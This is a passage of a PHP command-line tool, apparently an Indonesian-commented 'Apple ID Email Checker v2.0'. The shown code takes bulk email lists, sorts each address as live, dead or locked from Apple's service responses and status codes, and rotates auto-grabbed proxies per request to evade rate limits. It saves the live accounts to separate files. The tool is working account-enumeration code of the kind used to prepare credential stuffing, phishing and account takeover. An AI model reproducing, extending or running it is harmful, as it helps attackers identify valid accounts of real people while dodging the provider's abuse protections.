                        $result['message'] = !empty($errorMessage) ? $errorMessage : 'Account exists, trusted device verified';
                        return $result;
                        
                    case '-20751':
                        $result['status'] = 'LOCKED';
                        $result['status_label'] = 'Locked / Restricted';
                        $result['error_code'] = '-20751';
                        $result['message'] = !empty($errorMessage) ? $errorMessage : 'Account is locked or restricted';
                        return $result;
                        
                    case '-20100':
                        $result['status'] = 'DIE';
                        $result['status_label'] = 'Dead / Not Found';
                        $result['error_code'] = '-20100';
                        $result['message'] = !empty($errorMessage) ? $errorMessage : 'Account not found';
                        return $result;
                        
                    default:
                        $result['status'] = 'UNKNOWN';
                        $result['status_label'] = 'Unknown Error';
                        $result['error_code'] = $code;
                        $result['message'] = !empty($errorMessage) ? $errorMessage : 'Unknown error code: ' . $code;
                        return $result;
                }
            }
        }
        
        // Fallback berdasarkan HTTP code
        switch ($httpCode) {
            case 200:
                if (isset($data['accountName']) || isset($data['dsInfo']) || isset($data['trustedPhoneNumbers'])) {
                    $result['status'] = 'LIVE';
                    $result['status_label'] = 'Live (Authenticated)';
                    $result['message'] = 'Account exists and authenticated';
                } else {
                    $result['status'] = 'LIVE';
                    $result['status_label'] = 'Live (HTTP 200)';
                    $result['message'] = 'HTTP 200 response';
                }
                break;
            case 401:
                $result['status'] = 'DIE';
                $result['status_label'] = 'Dead / Unauthorized';
                $result['message'] = 'HTTP 401 - Unauthorized';
                break;
            case 403:
                $result['status'] = 'DIE';
                $result['status_label'] = 'Dead / Forbidden';
                $result['message'] = 'HTTP 403 - Forbidden';
                break;
            case 409:
                $result['status'] = 'LIVE';
                $result['status_label'] = 'Live (Conflict)';
                $result['message'] = 'HTTP 409 - Account exists, needs verification';
                break;
            case 412:
                $result['status'] = 'LIVE';
                $result['status_label'] = 'Live (No 2FA)';
                $result['message'] = 'HTTP 412 - Account needs repair/complete setup';
                break;
            case 429:
                $result['status'] = 'ERROR';
                $result['status_label'] = 'Rate Limited';
                $result['message'] = 'HTTP 429 - Too many requests';
                break;
            case 503:
                $result['status'] = 'ERROR';
                $result['status_label'] = 'Service Unavailable';
                $result['message'] = 'HTTP 503 - Apple service unavailable';
                break;
        }
        
        return $result;
    }
    
    /**
     * Check multiple emails dengan auto proxy rotation
     */
    public function checkMultiple(array $emails, bool $autoGrabProxy = true): array
    {
        // Auto grab proxy jika diperlukan
        if ($autoGrabProxy && $this->useProxyRotation && $this->proxyGrabber->getAvailableProxyCount() === 0) {
            echo "[*] Auto-grabbing proxies...\n";
            $proxies = $this->proxyGrabber->grabFromAllSources();
            if (!empty($proxies)) {
                echo "[*] Testing proxies...\n";
                $this->proxyGrabber->testAllProxies($proxies);
            }
        }
        
        $total = count($emails);
        $results = [];
        $liveCount = 0;
        $dieCount = 0;
        
        echo "\n[*] Memeriksa $total email dengan proxy rotation...\n";
        echo "[*] Proxy available: " . $this->proxyGrabber->getAvailableProxyCount() . "\n";
        echo str_repeat("=", 60) . "\n\n";
        
        foreach ($emails as $index => $email) {
            $email = trim($email);
            if (empty($email)) continue;
            
            // Dapatkan proxy untuk email ini (setiap email proxy berbeda)
            $proxy = $this->useProxyRotation ? $this->proxyGrabber->getNextProxy() : null;
            
            $progress = sprintf("[%d/%d]", $index + 1, $total);
            echo "$progress Checking: $email ... ";
            
            $result = $this->check($email, $proxy);
            $results[] = $result;
            
            // Tampilkan status
            $statusColor = '';
            switch ($result['status']) {
                case 'LIVE':
                    $statusColor = "\033[32m"; // Hijau
                    $liveCount++;
                    break;
                case 'DIE':
                    $statusColor = "\033[31m"; // Merah
                    $dieCount++;
                    break;
                case 'LOCKED':
                    $statusColor = "\033[33m"; // Kuning
                    break;
                default:
                    $statusColor = "\033[90m"; // Abu-abu
                    break;
            }
            
            $proxyInfo = $proxy ? " [Proxy: " . parse_url($proxy, PHP_URL_HOST) . "]" : "";
            echo $statusColor . $result['status'] . " (" . $result['status_label'] . ")\033[0m$proxyInfo\n";
            
            if ($this->verbose && $result['status'] === 'LIVE') {
                echo "  -> " . $result['message'] . "\n";
            }
            
            // Delay antar request
            if ($index < $total - 1 && $this->delayBetweenRequests > 0) {
                usleep($this->delayBetweenRequests);
            }
        }
        
        echo "\n" . str_repeat("=", 60) . "\n";
        echo "[*] Selesai! $total email diproses\n";
        echo "[*] LIVE: $liveCount | DIE: $dieCount | LOCKED: " . $this->stats['locked'] . " | ERROR: " . $this->stats['error'] . "\n";
        echo "[*] Proxy rotations: " . $this->stats['proxy_rotations'] . "\n";
        
        return $results;
    }
    
    /**
     * Check dari file
     */
    public function checkFromFile(string $filePath, bool $autoGrabProxy = true): array
    {
        if (!file_exists($filePath)) {
            throw new \Exception("File not found: $filePath");
        }
        
        $emails = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $emails = array_map('trim', $emails);
        
        return $this->checkMultiple($emails, $autoGrabProxy);
    }
    
    /**
     * Get results
     */
    public function getResults(): array
    {
        return $this->results;
    }
    
    /**
     * Get statistics
     */
    public function getStats(): array
    {
        return $this->stats;
    }
    
    /**
     * Get only LIVE results
     */
    public function getLiveResults(): array
    {
        return array_filter($this->results, fn($r) => $r['status'] === 'LIVE');
    }
    
    /**
     * Get only DIE results
     */
    public function getDieResults(): array
    {
        return array_filter($this->results, fn($r) => $r['status'] === 'DIE');
    }
    
    /**
     * Format results as table
     */
    public static function formatResults(array $results): string
    {
        $output = "+" . str_repeat("-", 35) . "+" . str_repeat("-", 10) . "+" . str_repeat("-", 28) . "+" . str_repeat("-", 12) . "+" . str_repeat("-", 22) . "+\n";
        $output .= sprintf("| %-33s | %-8s | %-26s | %-10s | %-20s |\n", "Email", "Status", "Label", "HTTP Code", "Proxy IP");
        $output .= "+" . str_repeat("-", 35) . "+" . str_repeat("-", 10) . "+" . str_repeat("-", 28) . "+" . str_repeat("-", 12) . "+" . str_repeat("-", 22) . "+\n";
        
        foreach ($results as $r) {
            $proxyIp = '';
            if (!empty($r['proxy_used'])) {
                $parsed = parse_url($r['proxy_used']);
                $proxyIp = $parsed['host'] ?? '';
            }
            
            $output .= sprintf(
                "| %-33s | %-8s | %-26s | %-10s | %-20s |\n",
                substr($r['email'], 0, 33),
                $r['status'],
                substr($r['status_label'], 0, 26),
                $r['http_code'],
                substr($proxyIp, 0, 20)
            );
        }
        
        $output .= "+" . str_repeat("-", 35) . "+" . str_repeat("-", 10) . "+" . str_repeat("-", 28) . "+" . str_repeat("-", 12) . "+" . str_repeat("-", 22) . "+\n";
        
        return $output;
    }
    
    /**
     * Export to CSV
     */
    public static function exportToCsv(array $results, string $filePath): bool
    {
        $fp = fopen($filePath, 'w');
        if (!$fp) return false;
        
        fwrite($fp, "\xEF\xBB\xBF");
        fputcsv($fp, ['Email', 'Status', 'Label', 'HTTP Code', 'Error Code', 'Message', 'Proxy Used']);
        
        foreach ($results as $r) {
            fputcsv($fp, [
                $r['email'],
                $r['status'],
                $r['status_label'],
                $r['http_code'],
                $r['error_code'] ?? '',
                $r['message'],
                $r['proxy_used'] ?? '',
            ]);
        }
        
        fclose($fp);
        return true;
    }
    
    /**
     * Export to JSON
     */
    public static function exportToJson(array $results, string $filePath): bool
    {
        return file_put_contents($filePath, json_encode($results, JSON_PRETTY_PRINT)) !== false;
    }
    
    /**
     * Export to TXT report
     */
    public static function exportToTxt(array $results, array $stats, string $filePath): bool
    {
        $live = count(array_filter($results, fn($r) => $r['status'] === 'LIVE'));
        $die = count(array_filter($results, fn($r) => $r['status'] === 'DIE'));
        $locked = count(array_filter($results, fn($r) => $r['status'] === 'LOCKED'));
        $error = count(array_filter($results, fn($r) => $r['status'] === 'ERROR'));
        $unknown = count(array_filter($results, fn($r) => $r['status'] === 'UNKNOWN'));
        
        $content = "========================================\n";
        $content .= "   APPLE ID EMAIL CHECKER - FULL REPORT\n";
        $content .= "========================================\n\n";
        $content .= "Date: " . date('Y-m-d H:i:s') . "\n";
        $content .= "Total Checked: " . count($results) . "\n";
        $content .= "Proxy Rotations: " . ($stats['proxy_rotations'] ?? 0) . "\n\n";
        
        $content .= "--- STATISTICS ---\n";
        $content .= "LIVE:   $live\n";
        $content .= "DIE:    $die\n";
        $content .= "LOCKED: $locked\n";
        $content .= "ERROR:  $error\n";
        $content .= "UNKNOWN: $unknown\n\n";
        
        $content .= "--- LIVE ACCOUNTS ---\n";
        foreach ($results as $r) {
            if ($r['status'] === 'LIVE') {
                $proxyInfo = !empty($r['proxy_used']) ? ' [Proxy: ' . parse_url($r['proxy_used'], PHP_URL_HOST) . ']' : '';
                $content .= $r['email'] . " | " . $r['status_label'] . " | HTTP " . $r['http_code'] . $proxyInfo . "\n";
            }
        }
        
        $content .= "\n--- ALL RESULTS ---\n";
        foreach ($results as $r) {
            $proxyInfo = !empty($r['proxy_used']) ? ' [Proxy: ' . parse_url($r['proxy_used'], PHP_URL_HOST) . ']' : '';
            $content .= $r['email'] . " | " . $r['status'] . " | " . $r['status_label'] . " | HTTP " . $r['http_code'] . $proxyInfo . "\n";
        }
        
        return file_put_contents($filePath, $content) !== false;
    }
}

// ============================================================
// CLI INTERFACE
// ============================================================

if (PHP_SAPI === 'cli' && isset($argv[0]) && basename($argv[0]) === basename(__FILE__)) {
    echo "\n";
    echo "========================================\n";
    echo "   APPLE ID EMAIL CHECKER v2.0\n";
    echo "   With Auto Proxy Grab & IP Rotation\n";
    echo "========================================\n\n";
    
    $options = getopt('', [
        'email:',
        'file:',
        'output:',
        'format:',
        'timeout:',
        'delay:',
        'retries:',
        'no-proxy',
        'proxy-file:',
        'max-proxies:',
        'verbose',
        'help',
    ]);
    
    if (isset($options['help']) || (empty($options['email']) && empty($options['file']))) {
        echo "Usage:\n";
        echo "  php apple_checker.php --email=user@icloud.com\n";
        echo "  php apple_checker.php --file=emails.txt\n";
        echo "  php apple_checker.php --file=emails.txt --output=results.csv --format=csv\n";
        echo "  php apple_checker.php --file=emails.txt --delay=2000000 --retries=3\n";
        echo "  php apple_checker.php --file=emails.txt --proxy-file=myproxies.txt\n";
        echo "  php apple_checker.php --file=emails.txt --max-proxies=200 --verbose\n\n";
        echo "Options:\n";
        echo "  --email=<email>       Check single email\n";
        echo "  --file=<path>         Check emails from file\n";
        echo "  --output=<path>       Save results to file\n";
        echo "  --format=<format>     Output: csv, json, txt (default: txt)\n";
        echo "  --timeout=<sec>       Request timeout (default: 30)\n";
        echo "  --delay=<us>          Delay in microseconds (default: 1000000 = 1s)\n";
        echo "  --retries=<n>         Max retries per email (default: 2)\n";
        echo "  --no-proxy            Disable proxy rotation (direct connection)\n";
        echo "  --proxy-file=<path>   Load proxies from file instead of auto-grab\n";
        echo "  --max-proxies=<n>     Max proxies to grab (default: 500)\n";
        echo "  --verbose             Show debug output\n";
        echo "  --help                Show this help\n";
        exit(0);
    }
    
    try {
        $checker = new AppleEmailChecker();
        
        if (isset($options['timeout'])) {
            $checker->setTimeout((int)$options['timeout']);
        }
        
        if (isset($options['delay'])) {
            $checker->setDelay((int)$options['delay']);
        }
        
        if (isset($options['retries'])) {
            $checker->setMaxRetries((int)$options['retries']);
        }
        
        if (isset($options['verbose'])) {
            $checker->setVerbose(true);
        }
        
        if (isset($options['no-proxy'])) {
            $checker->setProxyRotation(false);
            echo "[*] Proxy rotation disabled, using direct connection\n";
        }
        
        $proxyGrabber = $checker->getProxyGrabber();
        
        if (isset($options['max-proxies'])) {
        $proxyGrabber->setMaxProxies((int)$options['max-proxies']);
        }
        
        // Load proxy dari file atau auto grab
        if (isset($options['proxy-file'])) {
            echo "[*] Loading proxies from file: " . $options['proxy-file'] . "\n";
            $proxies = $proxyGrabber->loadFromFile($options['proxy-file']);
            echo "[*] Loaded " . count($proxies) . " proxies\n";
            
            if (!empty($proxies)) {
                echo "[*] Testing proxies...\n";
                $proxyGrabber->testAllProxies($proxies);
            }
        }
        
        // Check emails
        if (isset($options['email'])) {
            $results = [$checker->check($options['email'])];
        } elseif (isset($options['file'])) {
            $results = $checker->checkFromFile($options['file'], !isset($options['proxy-file']));
        } else {
            throw new \Exception("No email or file specified");
        }
        
        // Display results
        echo "\n" . AppleEmailChecker::formatResults($results);
        
        // Save to file
        if (isset($options['output'])) {
            $outputFile = $options['output'];
            $format = $options['format'] ?? 'txt';
            
            $saved = false;
            switch ($format) {
                case 'csv':
                    $saved = AppleEmailChecker::exportToCsv($results, $outputFile);
                    break;
                case 'json':
                    $saved = AppleEmailChecker::exportToJson($results, $outputFile);
                    break;
                default:
                    $saved = AppleEmailChecker::exportToTxt($results, $checker->getStats(), $outputFile);
                    break;
            }
            
            if ($saved) {
                echo "[+] Results saved to: $outputFile\n";
            } else {
                echo "[-] Failed to save results\n";
            }
        }
        
        // Auto save live accounts ke file terpisah
        $liveResults = $checker->getLiveResults();
        if (!empty($liveResults)) {
            $liveFile = 'live_accounts_' . date('Ymd_His') . '.txt';
            $content = "=== LIVE APPLE ACCOUNTS ===\n";
            $content .= "Date: " . date('Y-m-d H:i:s') . "\n";
            $content .= "Total: " . count($liveResults) . "\n\n";
            foreach ($liveResults as $r) {
                $content .= $r['email'] . " | " . $r['status_label'] . "\n";
            }
            file_put_contents($liveFile, $content);
            echo "[+] Live accounts saved to: $liveFile\n";
        }
        
        // Save proxy yang working
        $workingProxies = $proxyGrabber->getTestedProxies();
        if (!empty($workingProxies)) {
            $proxyFile = 'working_proxies_' . date('Ymd_His') . '.txt';
            $proxyGrabber->saveToFile($proxyFile, $workingProxies);
            echo "[+] Working proxies saved to: $proxyFile (" . count($workingProxies) . " proxies)\n";
        }
        
        // Final stats
        $stats = $checker->getStats();
        echo "\n=== FINAL STATISTICS ===\n";
        echo "Total Checked: {$stats['total']}\n";
        echo "LIVE: {$stats['live']}\n";
        echo "DIE: {$stats['die']}\n";
        echo "LOCKED: {$stats['locked']}\n";
        echo "ERROR: {$stats['error']}\n";
        echo "UNKNOWN: {$stats['unknown']}\n";
        echo "Proxy Rotations: {$stats['proxy_rotations']}\n";
        
    } catch (\Exception $e) {
        echo "ERROR: " . $e->getMessage() . "\n";
        exit(1);
    }
    
    exit(0);
}